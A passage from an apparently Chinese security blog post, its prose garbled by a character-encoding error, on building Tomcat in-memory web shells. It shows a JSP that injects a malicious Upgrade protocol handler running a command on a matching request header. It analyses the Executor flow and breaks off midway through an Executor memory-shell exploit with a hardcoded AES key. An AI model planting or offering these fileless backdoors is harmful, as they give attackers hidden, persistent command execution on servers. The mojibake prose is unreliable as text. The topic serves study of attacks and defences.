class="hljs-params">(SocketWrapperBase&lt;?&gt; socketWrapper, Adapter adapter)</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> InternalHttpUpgradeHandler <span class="hljs-title function_">getInternalUpgradeHandler</span><span class="hljs-params">(Adapter adapter, org.apache.coyote.Request request)</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">accept</span><span class="hljs-params">(org.apache.coyote.Request request)</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;;<br>    <span class="hljs-comment">//3.æ·»åŠ è¿›upgradeProtocols</span><br>    upgradeProtocols.put(<span class="hljs-string">&quot;clown&quot;</span>,upgradeProtocol);<br>%&gt;<br><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>ç„¶åè®¿é—®çš„æ—¶å€™å¸¦ä¸Šupgrade</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Upgrade: clown<br>Connection: Upgrade<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409222209433.png" alt="image-20240922220915371"></p><p><img src="https://cdn.clown2024.cn/202409222210497.png" alt="image-20240922221016377"></p><p>æˆåŠŸå¼¹è®¡ç®—å™¨</p><h1 id="tomcat-executorå†…å­˜é©¬"><a href="#Tomcat-Executorå†…å­˜é©¬" class="headerlink" title="Tomcat-Executorå†…å­˜é©¬"></a>Tomcat-Executorå†…å­˜é©¬</h1><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://mp.weixin.qq.com/s/cU2s8D2BcJHTc7IuXO-1UQ">https://mp.weixin.qq.com/s/cU2s8D2BcJHTc7IuXO-1UQ</a></p><h2 id="æ‰§è¡Œæµç¨‹åˆ†æ"><a href="#æ‰§è¡Œæµç¨‹åˆ†æ" class="headerlink" title="æ‰§è¡Œæµç¨‹åˆ†æ"></a>æ‰§è¡Œæµç¨‹åˆ†æ</h2><p>è¿™é‡Œä¸´æ—¶æ’å…¥é‡æ–°åˆ†æä¸€ä¸‹Connectorçš„æµç¨‹ï¼Œå› ä¸ºæœ‰ç‚¹ä¹±ï¼Œå¯¼è‡´æˆ‘åé¢çœ‹Executorå†…å­˜é©¬ä¼šæœ‰ç‚¹æ··ä¹±</p><p><strong>æœåŠ¡çš„å¯åŠ¨æ—¶</strong></p><p>è¿™é‡Œå°±è¯´ä¸€ä¸‹å„ä¸ªç±»çš„åˆå§‹åŒ–çš„é¡ºåºï¼Œä»StandardServiceçš„åˆå§‹åŒ–æ–¹æ³•å¼€å§‹</p><p><img src="https://cdn.clown2024.cn/202409262315547.png" alt="image-20240926231523449"></p><blockquote><p>å›¾åªæ˜¯å‚è€ƒï¼Œå…·ä½“æ–¹æ³•ä¸ä¸€å®šå¯¹ï¼Œå› ä¸ºæ˜¯åˆ«äººç”»çš„å›¾ï¼Œå¯èƒ½tomcatç‰ˆæœ¬ä¸ä¸€æ ·æ–¹æ³•åä¼šæœ‰å·®å¼‚ï¼Œè¿™é‡ŒæŒ‰ç…§çš„æ˜¯æˆ‘è‡ªå·±çš„ç‰ˆæœ¬åˆ†æ</p></blockquote><p>StandardService#initInternal</p><p><img src="https://cdn.clown2024.cn/202409262320249.png" alt="image-20240926232011146"></p><p>è¿™é‡Œæ‰§è¡Œäº†å›¾ä¸­çš„ä¸‰ä¸ªinitæ–¹æ³•ï¼Œé‡ç‚¹çœ‹initæ–¹æ³•ï¼Œè¿™é‡Œæœ‰executor.init()æ–¹æ³•ï¼Œä½†æ˜¯æ­¤æ—¶executorsæ•°ç»„ä¸ºç©ºæ‰€ä»¥æ²¡æœ‰æ‰§è¡Œï¼Œåº”è¯¥æ˜¯åœ¨åé¢æœ‰è¯·æ±‚çš„æ—¶å€™æ”¾å…¥</p><p>è¿™ä¸ªconnectoræ˜¯Connectorç±»ï¼Œç„¶åinitå»åˆ°äº†çˆ¶ç±»LifecycleBaseçš„initæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409262327581.png" alt="image-20240926232630314"></p><p>ç„¶åå†è°ƒç”¨initInternalæ–¹æ³•å›åˆ°Connector</p><p><img src="https://cdn.clown2024.cn/202409262328153.png" alt="image-20240926232843081"></p><p>ç„¶åè°ƒç”¨Http11NioProtocol#setAdapterè®¾ç½®ä¸€ä¸ªadapter</p><p>ç„¶åå¾€ä¸‹è°ƒç”¨äº†protocolHandler#init()æ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409262329171.png" alt="image-20240926232959094"></p><p>ç„¶ååˆèµ°åˆ°çˆ¶ç±»AbstractHttp11Protocolçš„initæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409262331554.png" alt="image-20240926233137474"></p><p>ç„¶ååˆæ‰ç”¨çˆ¶ç±»çš„AbstractProtocolçš„initæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409262332748.png" alt="image-20240926233241664"></p><p>é‡Œé¢åˆè°ƒç”¨NioEndpointçš„initæ–¹æ³•</p><p>ç„¶ååˆæ˜¯èµ°åˆ°çˆ¶ç±»AbstractJsseEndpointçš„initæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409262334655.png" alt="image-20240926233401589"></p><p>ç„¶ååˆè°ƒç”¨çˆ¶ç±»çš„AbstractEndpointçš„initæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409262335562.png" alt="image-20240926233521470"></p><p>è¿™é‡Œçš„bindæ–¹æ³•å°±æ˜¯è°ƒç”¨NioEndpointçš„bindæ–¹æ³•æ¥èµ·ä¸€ä¸ªsocketæœåŠ¡ç›‘å¬ç«¯å£äº†</p><p><img src="https://cdn.clown2024.cn/202409262336888.png" alt="image-20240926233650811"></p><p>é»˜è®¤çš„acceptCountæ˜¯100ï¼Œç„¶åè¿™å°±æ˜¯å¤§æ¦‚çš„æµç¨‹</p><p>é¡ºä¾¿æä¸€ä¸‹ï¼Œä¸€å¼€å§‹çš„connectoræ˜¯æœ‰ä¸¤ä¸ªçš„ï¼Œå¦‚ä¸‹ï¼š</p><p><img src="https://cdn.clown2024.cn/202409262352133.png" alt="image-20240926235226049"></p><p><strong>æ¥å—è¯·æ±‚åçš„åˆ†æ</strong></p><p>è¿™é‡Œå°±åˆ†æåˆ°Executorçš„ä½ç½®ï¼Œå› ä¸ºè¿™æ˜¯ä¸´æ—¶æ’å…¥çš„ä¸‹é¢å·²ç»å†™å¥½äº†æ‡’å¾—åŠ¨äº†ğŸ˜¢</p><p>å‰é¢æ–‡ç« è¯´åˆ°ï¼Œæ¥å—äº†è¯·æ±‚ä¹‹åä¼šä¼ é€’ç»™setSocketOptionsæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409270008999.png" alt="image-20240927000803914"></p><p>ç„¶åè¿™é‡Œè·å–äº†Polleræ³¨å†Œäº†channel</p><p><img src="https://cdn.clown2024.cn/202409270009941.png" alt="image-20240927000918856"></p><p>ç„¶åè¿™ä¸ªPollerä¹Ÿæ˜¯å®ç°äº†Runnableæ¥å£çš„ï¼Œé‚£åé¢å°±ä¼šèµ°åˆ°ä»–çš„runæ–¹æ³•é‡Œé¢ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202409270011717.png" alt="image-20240927001157616"></p><p>ç„¶åprocessKeyé‡Œé¢åˆä¼šèµ°åˆ°ä¸€ä¸ªprocessSocketæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409270012045.png" alt="image-20240927001244969"></p><p>ç„¶åå°±ä¼šèµ°åˆ°æˆ‘ä»¬è¦é‡ç‚¹å…³æ³¨çš„<strong>executor.execute</strong>æ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409270013273.png" alt="image-20240927001342167"></p><blockquote><p>å¤§æ¦‚å°±æ˜¯è¿™æ ·ï¼Œä½†æ˜¯è°ƒè¯•çš„æ—¶å€™æœ‰æ—¶å€™æµç¨‹è¿˜æ˜¯ä¼šå˜å¾—å¾ˆæ€ªï¼Œå°¤å…¶æ˜¯ä¸­é—´è·³åˆ°Executoré‚£ä¸€å—ï¼Œè°ƒçš„å¹¶ä¸æ˜¯å¾ˆæ˜ç™½</p></blockquote><h2 id="åŸç†åˆ†æ"><a href="#åŸç†åˆ†æ-2" class="headerlink" title="åŸç†åˆ†æ"></a>åŸç†åˆ†æ</h2><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://xz.aliyun.com/t/11593?time__1311=n4+hiIqGx0xfxCw4mqGNapDNDkIetK4GOexAoTD&u_atoken=0088f6c6149c7ae10aab8ab2e8ed1bd8&u_asig=0a472f9217270143300633216e003d">Executorå†…å­˜é©¬çš„å®ç° - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><p>è¿™é‡Œåˆå¼•ç”¨æ–‡ç« ä¸­connectorçš„ç»“æ„å›¾ï¼š</p><p><img src="https://cdn.clown2024.cn/202409230948596.png" alt="image-20240923094855433"></p><p>connectorå°±åˆ†ä¸ºProtocolHandlerå’ŒAdapterï¼ŒProtocolHandlerå°±ç”¨æ¥å¤„ç†è¯·æ±‚ï¼ŒAdapterå°±æ˜¯connectorå’Œcontainerçš„æ¡¥æ¢ï¼Œç”¨äºå°†å¤„ç†åçš„è¯·æ±‚ä¼ é€’ç»™container</p><p>æœ‰å…³äºProtocolHandlerçš„åˆ†ç±»åœ¨å‰é¢çš„å†…å­˜é©¬ä¹Ÿäº†è§£äº†ä¸€ç‚¹ï¼Œæ–‡ç« ä¸­åˆåšäº†ä¸€ä¸ªå¯¼å›¾æ¥åˆ†ç±»æ›´åŠ æ¸…æ™°ï¼Œä¹Ÿæ”¾ä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202409230957003.png" alt="image-20240923095712898"></p><p>è¿™é‡Œå…³æ³¨Http11NioProtocolçš„å®ç°</p><p>Endpointæ˜¯ProtocolHandlerçš„ç»„æˆä¹‹ä¸€ï¼Œè€ŒNioEndpointæ˜¯Http11NioProtoclä¸­çš„å®ç°ã€‚<br>Endpointäº”å¤§ç»„ä»¶ï¼š</p><ul><li>LimitLatchï¼šè¿æ¥æ§åˆ¶å™¨ï¼Œè´Ÿè´£æ§åˆ¶æœ€å¤§çš„è¿æ¥æ•°</li><li>Acceptorï¼šè´Ÿè´£æ¥æ”¶æ–°çš„è¿æ¥ï¼Œç„¶åè¿”å›ä¸€ä¸ªChannelå¯¹è±¡ç»™Poller</li><li>Pollerï¼šå¯ä»¥å°†å…¶çœ‹æˆæ˜¯NIOä¸­Selectorï¼Œè´Ÿè´£ç›‘æ§Channelçš„çŠ¶æ€</li><li>SocketProcessorï¼šå¯ä»¥çœ‹æˆæ˜¯ä¸€ä¸ªè¢«å°è£…çš„ä»»åŠ¡ç±»</li><li>Executorï¼šTomcatè‡ªå·±æ‰©å±•çš„çº¿ç¨‹æ± ï¼Œç”¨æ¥æ‰§è¡Œä»»åŠ¡ç±»</li></ul><p>é‡ç‚¹çœ‹Executorçš„è¿‡ç¨‹</p><p><img src="https://cdn.clown2024.cn/202409242331554.png" alt="image-20240924233136428"></p><p>æˆ‘ä»¬è¿™é‡Œåœ¨AbstractEndPoint#processSocketæ–¹æ³•å¤„æ‰“æ–­ç‚¹ï¼Œå¯ä»¥çœ‹åˆ°ä»–è¿™é‡Œåˆ›å»ºäº†ä¸€ä¸ªExecutorï¼Œç„¶åä¸‹ä¸€æ­¥executeäº†ä¸€ä¸ªçº¿ç¨‹ä»»åŠ¡</p><blockquote><p>åœ¨Tomcatä¸­Executorç”±Serviceç»´æŠ¤ï¼Œå› æ­¤åŒä¸€ä¸ªServiceä¸­çš„ç»„ä»¶å¯ä»¥å…±äº«ä¸€ä¸ªçº¿ç¨‹æ± ã€‚å¦‚æœæ²¡æœ‰å®šä¹‰ä»»ä½•çº¿ç¨‹æ± ï¼Œç›¸å…³ç»„ä»¶( å¦‚Endpoint)ä¼šè‡ªåŠ¨åˆ›å»ºçº¿ç¨‹æ± ï¼Œæ­¤æ—¶ï¼Œçº¿ç¨‹æ± ä¸å†å…±äº«ã€‚</p></blockquote><p>è·Ÿè¿›å»executeæ–¹æ³•çœ‹çœ‹</p><p><img src="https://cdn.clown2024.cn/202409242335057.png" alt="image-20240924233503993"></p><p><img src="https://cdn.clown2024.cn/202409242335760.png" alt="image-20240924233534681"></p><p>æ‰€ä»¥çŸ¥é“é€»è¾‘åå’Œå‰é¢ä¸€æ ·ï¼Œç»§æ‰¿å¯¹åº”çš„ç±»ç„¶åå°†æ¶æ„ä»£ç é‡å†™è¿›æ–¹æ³•é‡Œé¢</p><p>è¿™é‡Œçš„Executorç±»æ˜¯ThreadPoolExecutorç±»</p><p><img src="https://cdn.clown2024.cn/202409271641484.png" alt="image-20240927164111381"></p><p>è¯¥ç±»ç»§æ‰¿çš„æºå¤´å°±æ˜¯Executoræ¥å£</p><p><img src="https://cdn.clown2024.cn/202409271644613.png" alt="image-20240927164456561"></p><p>æ–‡ç« ä¸­æ˜¯ç»§æ‰¿äº†ThreadPoolExecutorç±»ç„¶åé‡å†™äº†executeæ–¹æ³•ï¼Œç„¶åé€šè¿‡AbstractEndPointçš„setExecutoræ–¹æ³•å°†åŸæ¥çš„executoræ›¿æ¢ä¸ºæˆ‘ä»¬çš„æ¶æ„ç±»å³å¯</p><p><img src="https://cdn.clown2024.cn/202409271652002.png" alt="image-20240927165222949"></p><p><strong>æ›¿æ¢Executor</strong></p><p>é‚£è¦æ€ä¹ˆæ›¿æ¢executorå‘¢ï¼Œé‚£ç…§ä¾‹æœ€å¥½ä¹Ÿæ˜¯ä»requestçœ‹èƒ½ä¸èƒ½æ‰¾åˆ°AbstractEndPointå¯¹è±¡ï¼Œæ°å¥½æˆ‘ä»¬èƒ½æ‰¾åˆ°è¿™æ ·çš„è·¯å¾„</p><p>request(RequestFacade)â€“&gt;request(Request)â€“&gt;connector(Connector)â€“&gt;protocolHandler(Http11NioProtocol)â€“&gt;endpoint(NioEndpoint)â€“&gt;acceptors(AbstractEndpoint)</p><p>ç„¶åä¹Ÿæ˜¯å’Œå‰é¢ä¸€æ ·åå°„è·å–ç„¶åè°ƒç”¨setExecutoræ–¹æ³•å³å¯</p><p><strong>å›æ˜¾é—®é¢˜</strong></p><p>ç°åœ¨æˆ‘ä»¬è™½ç„¶å¯ä»¥æ›¿æ¢äº†ï¼Œä½†æ˜¯æ•°æ®è¿˜æ— æ³•å›æ˜¾å‡ºæ¥ï¼Œå› ä¸ºæˆ‘ä»¬çš„ServletRequestè¿˜æ²¡æœ‰å°è£…ï¼Œéœ€è¦åˆ°åé¢çš„Processoré˜¶æ®µæ‰è¡Œï¼Œæˆ‘ä»¬å½“å‰è¿˜åœ¨EndPointé˜¶æ®µ</p><p>é‚£å°±éœ€è¦æˆ‘ä»¬èƒ½å¤ŸæŒ–æ˜å‡ºå“ªä¸ªå¯¹è±¡é‡Œé¢å­˜æ”¾ç€Requestå¯¹è±¡ï¼Œæˆ‘ä»¬éœ€è¦æŒ–å‡ºä¸€æ¡é“¾å­ï¼Œç„¶åæˆ‘ä»¬å¾€Requestå¯¹è±¡ä¸Šå°è£…æˆ‘ä»¬çš„å‘½ä»¤ç»“æœï¼Œæ¯”å¦‚å°†ç»“æœæ·»åŠ åˆ°è¯·æ±‚å¤´ä¸Šå›æ˜¾å‡ºæ¥</p><p>æŒ–æ˜å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼Œå±å®æ˜¯å­¦åˆ°äº†ï¼š<a href="https://gv7.me/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/">https://gv7.me/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/</a></p><p>é‡Œé¢æœ‰ä¸€ä¸ªå¯¹è±¡æœç´¢å·¥å…·ï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿çš„å®Œæˆå¯¹requestå¯¹è±¡çš„æœç´¢ï¼š<a href="https://github.com/c0ny1/java-object-searcher">https://github.com/c0ny1/java-object-searcher</a></p><blockquote><p>è¿™ä¸ªå·¥å…·åªæœ‰æºç ï¼Œæˆ‘ä½¿ç”¨çš„æ—¶å€™æ˜¯å…ˆç”¨mavençš„installæŒ‡ä»¤å¯¼å‡ºjaråŒ…åˆ°æœ¬åœ°ä»“åº“ï¼Œç„¶åå†é€šè¿‡pomæ–‡ä»¶æ¥å¼•å…¥</p></blockquote><p>ç„¶åæ ¹æ®æ–‡æ¡£ç”¨ä¸‹é¢ä»£ç æœç´¢request</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.servletshell;<br><br><br><span class="hljs-keyword">import</span> me.gv7.tools.josearcher.entity.Blacklist;<br><span class="hljs-keyword">import</span> me.gv7.tools.josearcher.entity.Keyword;<br><span class="hljs-keyword">import</span> me.gv7.tools.josearcher.searcher.SearchRequstByBFS;<br><br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-meta">@WebServlet(&quot;/test&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-comment">//è®¾ç½®æœç´¢ç±»å‹åŒ…å«ServletRequestï¼ŒRequstGroupï¼ŒRequest...ç­‰å…³é”®å­—çš„å¯¹è±¡</span><br>        List&lt;Keyword&gt; keys = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        keys.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Keyword</span>.Builder().setField_type(<span class="hljs-string">&quot;request&quot;</span>).build());<br>        <span class="hljs-comment">//è®¾ç½®é»‘åå•</span><br>        List&lt;Blacklist&gt; blacklists = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        blacklists.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Blacklist</span>.Builder().setField_type(<span class="hljs-string">&quot;java.io.File&quot;</span>).build());<br>        <span class="hljs-comment">//æ–°å»ºä¸€ä¸ªå¹¿åº¦ä¼˜å…ˆæœç´¢Thread.currentThread()çš„æœç´¢å™¨</span><br>        <span class="hljs-type">SearchRequstByBFS</span> <span class="hljs-variable">searcher</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SearchRequstByBFS</span>(Thread.currentThread(),keys);<br>        <span class="hljs-comment">//æ‰“å¼€è°ƒè¯•æ¨¡å¼</span><br>        searcher.setIs_debug(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//æŒ–æ˜æ·±åº¦ä¸º20</span><br>        searcher.setMax_search_depth(<span class="hljs-number">20</span>);<br>        <span class="hljs-comment">//è®¾ç½®æŠ¥å‘Šä¿å­˜ä½ç½®</span><br>        searcher.setReport_save_path(<span class="hljs-string">&quot;D:\\CTF\\Java\\JavaCode\\ServletShell&quot;</span>);<br>        searcher.searchObject();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409272014082.png" alt="image-20240927201422968"></p><p>è¿™é‡Œç»™å‡ºäº†å¾ˆå¤šçš„é“¾å­ï¼Œæˆ‘ä»¬Ctrl+Få»æœç´¢**request &#x3D;**æ‰¾ä¸€ä¸‹èƒ½åˆ©ç”¨çš„ï¼Œæ–‡ç« ä¸­æ‰¾çš„æ˜¯è¿™æ¡é“¾å­</p><p><img src="https://cdn.clown2024.cn/202409272035854.png" alt="image-20240927203519789"></p><p>é‡Œé¢æœ‰ä¸ªNioEndpointï¼Œåˆšå¥½æ˜¯æˆ‘ä»¬èƒ½è·å–åˆ°çš„ï¼Œæˆ‘ä»¬åœ¨è¿™é‡Œä¸‹æ–­ç‚¹ç„¶åstep overå»è°ƒè¯•</p><p><img src="https://cdn.clown2024.cn/202409272028044.png" alt="image-20240927202757759"></p><p>æ‰“å®Œæ–­ç‚¹ä¹‹åæˆ‘ä»¬å°±åˆ°å †æ ˆçš„Threadçš„ä½ç½®å¼€å§‹é¡ºç€é“¾å­æ‰¾</p><p><img src="https://cdn.clown2024.cn/202409272105715.png" alt="image-20240927210521619"></p><p>æœ€ç»ˆæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°request</p><p>ç„¶åå†å¾€é‡Œæ‰¾ï¼Œå¯ä»¥æ‰¾åˆ°ä¸€ä¸ªinputBufferï¼Œé‡Œé¢å­˜æ”¾ç€æˆ‘ä»¬çš„GETå†…å®¹</p><p><img src="https://cdn.clown2024.cn/202409272109789.png" alt="image-20240927210934698"></p><p>å¯ä»¥å°†å­—èŠ‚æ•°ç»„view as stringï¼Œç„¶åæŸ¥çœ‹å³å¯ï¼Œç°åœ¨æˆ‘ä»¬å°±å¯ä»¥åšåˆ°å°†å‘½ä»¤æ”¾å…¥requestçš„è¯·æ±‚å¤´ä¸­ï¼Œä¸‹ä¸€æ­¥å°±æ˜¯è¦å°†å…¶ä½œä¸ºresponseçš„headerä¼ å‡º</p><p>è¿™é‡Œresponseå¯¹è±¡å’Œrequeståœ¨åŒä¸€çº§ä¸‹ï¼Œéƒ½åœ¨connectionsé‡Œé¢</p><p><img src="https://cdn.clown2024.cn/202409272120291.png" alt="image-20240927212000209"></p><p>è¿™æ ·responseæˆ‘ä»¬ä¹Ÿæœ‰äº†ï¼Œæå‰å°†ç»“æœå°è£…è¿›responseå³å¯ï¼Œç°åœ¨å°±æ¥ç¼–å†™å†…å­˜é©¬</p><h2 id="å†…å­˜é©¬ç¼–å†™"><a href="#å†…å­˜é©¬ç¼–å†™-2" class="headerlink" title="å†…å­˜é©¬ç¼–å†™"></a>å†…å­˜é©¬ç¼–å†™</h2><p>ç•™ä¸ªå‘å…ˆï¼Œåˆ†æå¾—å¥½ç´¯ä¹Ÿè¿˜æ²¡æ˜ç™½ï¼Œåˆ«äººçš„å†…å­˜é©¬exp</p><figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.net.NioEndpoint&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.threads.ThreadPoolExecutor&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.concurrent.TimeUnit&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.concurrent.BlockingQueue&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.concurrent.ThreadFactory&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.nio.ByteBuffer&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.ArrayList&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.coyote.RequestInfo&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.coyote.Response&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.nio.charset.StandardCharsets&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.concurrent.RejectedExecutionHandler&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br><br><br>&lt;%!<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_SECRET_KEY</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;blueblueblueblue&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">AES</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;AES&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">byte</span>[] KEY_VI = <span class="hljs-string">&quot;blueblueblueblue&quot;</span>.getBytes();<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">CIPHER_ALGORITHM</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;AES/CBC/PKCS5Padding&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> java.util.Base64.<span class="hljs-type">Encoder</span> <span class="hljs-variable">base64Encoder</span> <span class="hljs-operator">=</span> java.util.Base64.getEncoder();<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> java.util.Base64.<span class="hljs-type">Decoder</span> <span class="hljs-variable">base64Decoder</span> <span class="hljs-operator">=</span> java.util.Base64.getDecoder();<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">decode</span><span class="hljs-params">(String key, String content)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            javax.crypto.<span class="hljs-type">SecretKey</span> <span class="hljs-variable">secretKey</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">javax</span>.crypto.spec.SecretKeySpec(key.getBytes(), AES);<br>            javax.crypto.<span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span class="hljs-operator">=</span> javax.crypto.Cipher.getInstance(CIPHER_ALGORITHM);<br>            cipher.init(javax.crypto.Cipher.DECRYPT_MODE, secretKey, <span class="hljs-keyword">new</span> <span class="hljs-title class_">javax</span>.crypto.spec.IvParameterSpec(KEY_VI));<br><br>            <span class="hljs-type">byte</span>[] byteContent = base64Decoder.decode(content);<br>            <span class="hljs-type">byte</span>[] byteDecode = cipher.doFinal(byteContent);<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(byteDecode, java.nio.charset.StandardCharsets.UTF_8);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">encode</span><span class="hljs-params">(String key, String content)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            javax.crypto.<span class="hljs-type">SecretKey</span> <span class="hljs-variable">secretKey</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">javax</span>.crypto.spec.SecretKeySpec(key.getBytes(), AES);<br>            javax.crypto.<span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span class="hljs-operator">=</span> javax.crypto.Cipher.getInstance(CIPHER_ALGORITHM);<br>            cipher.init(javax.crypto.Cipher.ENCRYPT_MODE, secretKey, <span class="hljs-keyword">new</span> <span class="hljs-title class_">javax</span>.crypto.spec.IvParameterSpec(KEY_VI));<br>            <span class="hljs-type">byte</span>[] byteEncode = content.getBytes(java.nio.charset.StandardCharsets.UTF_8);<br>            <span class="hljs-type">byte</span>[] byteAES = cipher.doFinal(byteEncode);<br>            <span class="hljs-keyword">return</span> base64Encoder.encodeToString(byteAES);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getField</span><span class="hljs-params">(Object object, String fieldName)</span> &#123;<br>        Field declaredField;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> object.getClass();<br>        <span class="hljs-keyword">while</span> (clazz != Object.class) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br><br>                declaredField = 